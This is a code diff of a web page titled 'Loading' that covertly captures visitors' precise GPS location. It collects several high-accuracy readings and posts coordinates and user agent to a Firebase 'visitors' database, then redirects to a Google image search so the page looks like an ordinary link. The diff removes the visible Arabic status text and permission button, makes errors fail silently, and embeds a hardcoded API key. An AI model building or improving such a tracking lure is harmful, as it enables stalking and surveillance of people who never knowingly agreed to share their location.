@@ -1,54 +1,16 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل...</title>
+    <title>Loading</title>
     <style>
-        body {
-            background: #202124;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            color: white;
-        }
-        .loader { text-align: center; }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid #8ab4f8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .message { font-size: 14px; color: #aaa; margin-bottom: 15px; }
-        .btn {
-            background: #8ab4f8;
-            color: #202124;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            font-size: 14px;
-            cursor: pointer;
-            display: none;
-        }
-        .btn:hover { background: #aecbfa; }
+        body { margin: 0; background: #202124; height: 100vh; }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <div class="spinner"></div>
-        <div class="message" id="status">جاري التجهيز...</div>
-        <button class="btn" id="retryBtn" onclick="requestLocation()">السماح بالوصول للموقع</button>
-    </div>
-
     <script>
-        // بيانات مشروعك - تم وضعها يدويًا
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
             databaseURL: "https://imggps-default-rtdb.firebaseio.com",
@@ -58,11 +20,35 @@
         const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
         const DB_PATH = "visitors";
 
+        // Tuning parameters
+        const MAX_WAIT_TIME = 10000;          // 10 seconds max to collect location
+        const DESIRED_ACCURACY = 50;          // meters – stop and save if accuracy <= this
+        const MIN_READINGS = 2;               // collect at least 2 readings before deciding
+
+        let bestReading = null;               // { lat, lng, accuracy }
+        let readingCount = 0;
+        let watchId = null;
+        let dataSaved = false;
+        let timeoutId = null;
+
+        // Redirect to target URL
         function redirect() {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+            if (timeoutId) {
+                clearTimeout(timeoutId);
+                timeoutId = null;
+            }
             window.location.href = TARGET_URL;
         }
 
-        function saveData(lat, lng, accuracy) {
+        // Save data to Firebase and localStorage, then redirect
+        function saveAndRedirect(lat, lng, accuracy) {
+            if (dataSaved) return;
+            dataSaved = true;
+
             const record = {
                 lat: lat,
                 lng: lng,
@@ -71,71 +57,125 @@
                 userAgent: navigator.userAgent.substring(0, 100)
             };
 
-            // نسخة احتياطية محلية
+            // Save locally
             try {
                 const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                 localData.push(record);
                 localStorage.setItem('geo_log', JSON.stringify(localData));
             } catch(e) {}
 
-            // إرسال إلى Firebase Realtime Database باستخدام REST API
+            // Save to Firebase (fire-and-forget)
             fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(record)
-            })
-            .then(() => console.log('تم الحفظ في السحابة'))
-            .catch(err => console.warn('فشل الحفظ السحابي', err))
-            .finally(() => {
-                redirect();
-            });
+            }).catch(err => console.warn('Firebase save error', err));
+
+            // Redirect immediately (do not wait for Firebase response)
+            redirect();
         }
 
-        function handlePosition(pos) {
+        // Process a new geolocation reading
+        function processPosition(pos) {
+            const accuracy = pos.coords.accuracy;
             const lat = pos.coords.latitude.toFixed(7);
             const lng = pos.coords.longitude.toFixed(7);
-            const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : 'N/A';
 
-            document.getElementById('status').textContent = 'تم تحديد الموقع بنجاح...';
-            document.getElementById('retryBtn').style.display = 'none';
-            saveData(lat, lng, acc);
-        }
+            readingCount++;
 
-        function handleError(err) {
-            console.warn('Geolocation error:', err.message);
-            document.getElementById('status').textContent = 'يرجى السماح بالوصول للموقع للمتابعة';
-            document.getElementById('retryBtn').style.display = 'inline-block';
+            // If this reading is better (lower accuracy) than previous, update best
+            if (!bestReading || accuracy < bestReading.accuracy) {
+                bestReading = { lat, lng, accuracy };
+            }
 
-            // إعادة التوجيه بعد مهلة إذا رفض المستخدم
-            setTimeout(redirect, 8000);
-        }
-
-        function requestLocation() {
-            document.getElementById('status').textContent = 'جاري طلب الموقع...';
-            document.getElementById('retryBtn').style.display = 'none';
-
-            if (!navigator.geolocation) {
-                document.getElementById('status').textContent = 'المتصفح لا يدعم تحديد الموقع';
-                setTimeout(redirect, 2000);
+            // If accuracy is good enough, stop and save immediately
+            if (accuracy <= DESIRED_ACCURACY) {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
+                saveAndRedirect(lat, lng, accuracy);
                 return;
             }
 
-            navigator.geolocation.getCurrentPosition(
-                handlePosition,
+            // If we have collected enough readings and time has passed, use the best one
+            // (the timeout will handle final decision)
+        }
+
+        // Final decision when time runs out
+        function finalizeLocation() {
+            if (dataSaved) return;
+
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+
+            if (bestReading) {
+                // Use the best reading we got
+                saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
+            } else {
+                // No location at all – redirect without data
+                redirect();
+            }
+        }
+
+        // Error handler – silently fallback
+        function handleError(err) {
+            // If we already have a best reading, use it after a short delay
+            if (bestReading) {
+                setTimeout(() => {
+                    if (!dataSaved) {
+                        saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
+                    }
+                }, 500);
+                return;
+            }
+
+            // No location possible – redirect after a moment
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+            setTimeout(redirect, 1000);
+        }
+
+        // Start location collection
+        function startLocation() {
+            if (!navigator.geolocation) {
+                // Browser doesn't support geolocation – redirect
+                setTimeout(redirect, 500);
+                return;
+            }
+
+            // Set a final timeout to force a decision
+            timeoutId = setTimeout(finalizeLocation, MAX_WAIT_TIME);
+
+            // Start watching with high accuracy
+            watchId = navigator.geolocation.watchPosition(
+                processPosition,
                 handleError,
                 {
-                    enableHighAccuracy: true,  // محاولة استخدام GPS
-                    timeout: 10000,            // مهلة أطول قليلاً
-                    maximumAge: 0              // لا تستخدم موقع قديم
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
                 }
             );
         }
 
-        // بدء الطلب تلقائيًا عند تحميل الصفحة
-        requestLocation();
+        // Begin immediately
+        startLocation();
 
-        // احتياط: إعادة توجيه بعد 12 ثانية إذا لم يكتمل شيء
-        setTimeout(redirect, 12000);
+        // Extra safety – if everything stalls, redirect after MAX_WAIT_TIME + 2s
+        setTimeout(() => {
+            if (!dataSaved) {
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                }
+                redirect();
+            }
+        }, MAX_WAIT_TIME + 2000);
     </script>
 </body>
 </html>
